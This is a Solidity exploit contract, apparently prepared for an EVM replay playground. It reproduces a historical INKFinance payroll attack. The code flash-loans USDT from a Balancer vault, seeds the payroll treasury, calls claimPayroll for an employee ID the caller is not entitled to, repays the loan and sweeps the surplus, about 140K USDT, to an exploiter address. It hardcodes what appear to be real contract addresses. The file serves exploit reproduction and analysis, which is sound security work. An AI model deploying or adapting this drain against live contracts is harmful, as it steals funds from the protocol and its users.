// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2026-05-INKFinance).
// Faithful copy of `INKFinanceFlashLoanReceiver` from
// src/test/2026-05/INKFinance_exp.sol, with TWO changes:
//   1. `EXPLOITER` is a regular storage variable (slot 0) instead of
//      `immutable` (etchAt skips the constructor, so an immutable can't be
//      patched in — the static artifact has the immutable slot zeroed).
//   2. An added `attack()` entrypoint that itself calls
//      `BALANCER_VAULT.flashLoan(address(this), ...)` — the original test's
//      attacker EOA calls `flashLoan()` directly on the Balancer Vault, which
//      then calls back into `receiveFlashLoan()` on this same contract. The
//      EVM Playground's recorder always calls a single `attackFunction`
//      directly ON the exploit/etched contract as the attacker, so the
//      flash-loan kickoff must be folded into this contract instead of
//      living on the attacker EOA's call site.
//
// Why etchAt: the Balancer Vault calls back into a FIXED recipient address
// (FLASH_LOAN_RECEIVER, 0xD7C643517F98F58D3F9BA91De05d4f62620cFd10) that
// already holds relevant state in the historical dump. The original test
// deploys INKFinanceFlashLoanReceiver normally, then `vm.etch`es its already-
// resolved runtime code onto FLASH_LOAN_RECEIVER. We mirror this with
// `etchAt` — the playground's `vm.etch` equivalent — placing this contract's
// runtime code directly at FLASH_LOAN_RECEIVER and calling `attack()` there.
//
// Root cause (unchanged from the original): INKPayroll's claimPayroll() lets
// anyone claim payroll for a given employee ID *while holding a flash loan of
// the treasury's own USDT* — the payroll callback interface check
// (supportsInterface) is satisfied by the receiver contract, so the Payroll
// contract pays out from the just-seeded TREASURY balance without verifying
// the caller is actually the entitled employee. The receiver seeds TREASURY
// with the full flash-loaned amount, triggers claimPayroll(), repays the
// flash loan, and sweeps whatever payroll surplus landed back in the
// receiver's own balance — netting ~140K USDT with no real employee funds.

interface IERC20Like {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IINKBalancerVaultLike {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

interface IINKPayrollLike {
    function claimPayroll(uint256 employeeId) external;
}

interface IERC165Like {
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

contract INKFinanceDrain {
    // Slot 0 — set via a `storeSlot` setup step after this contract's runtime
    // code is etched onto FLASH_LOAN_RECEIVER (replaces the original's
    // `immutable`, which `etchAt` cannot patch since it skips the constructor).
    address internal EXPLOITER;

    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant PAYROLL = 0xeF2C77f3B9b8aaa067239bc6B4588Bae26433494;
    address internal constant TREASURY = 0xa184Af4B1c01815A4B57422A3419E4FB78a96Ee4;
    IERC20Like internal constant USDT = IERC20Like(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    uint256 internal constant EMPLOYEE_ID = 3;
    uint256 internal constant FLASH_LOAN_AMOUNT = 24_982_654_321;
    bytes4 internal constant PAYROLL_RECEIVER_INTERFACE_ID = 0xf3384444;

    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDT);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_LOAN_AMOUNT;

        IINKBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        IERC20Like[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        userData;
        require(msg.sender == BALANCER_VAULT, "unexpected vault");
        require(tokens.length == 1 && address(tokens[0]) == address(USDT), "unexpected token");
        require(feeAmounts.length == 1 && feeAmounts[0] == 0, "unexpected fee");

        require(USDT.transfer(TREASURY, amounts[0]), "seed treasury failed");
        IINKPayrollLike(PAYROLL).claimPayroll(EMPLOYEE_ID);
        require(USDT.transfer(BALANCER_VAULT, amounts[0]), "repay failed");
        require(USDT.transfer(EXPLOITER, USDT.balanceOf(address(this))), "sweep failed");
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == PAYROLL_RECEIVER_INTERFACE_ID || interfaceId == type(IERC165Like).interfaceId;
    }
}
